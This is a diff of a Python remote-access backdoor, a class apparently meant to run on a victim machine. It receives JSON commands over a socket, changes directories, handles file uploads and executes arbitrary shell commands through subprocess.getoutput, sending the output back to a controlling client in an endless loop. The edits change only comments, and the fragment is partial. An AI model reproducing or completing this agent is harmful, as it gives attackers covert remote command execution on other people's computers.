@@ -35,12 +35,12 @@ class MotherFucker():
             pass
 
     def json_send(self, data):
-        # Outputs commands in a json format and send it over
+        # Outputs commands in a json format and sends it to the server
         json_data = json.dumps(data).encode('utf-8')
         self.connection.send(json_data)
 
     def json_recv(self):
-        #so basically just dumps the commands recived from client in a json  format
+        # Recives commands form client in a json format
         json_data = ""
         while True:
             try:
@@ -50,7 +50,7 @@ class MotherFucker():
                 continue
 
     def change_working_dir(self, path):
-        #Changes Working directory basicly a $ cd whatever
+        # Changes Working directory with "$ cd" command
         os.chdir(path)
         return "Changed dir to %s" % path
 
@@ -72,14 +72,13 @@ class MotherFucker():
             print("[-] Error during file upload. \n %s" % (e))
 
     def execute_system_command(self, command):
-        #used check_output instead of call or run or whatever else cause it actualy sends the result of command back and we can see it in Client
+        # used check_output instead of call or run , sends the result of command back and we can see it in Client
         try:
             return subprocess.getoutput(command)
         except Exception as e:
             pass
 
     def run(self):
-        # while loop for never stopping
         while True:
             # gets the cmd
             rcvd_cmd = self.json_recv()
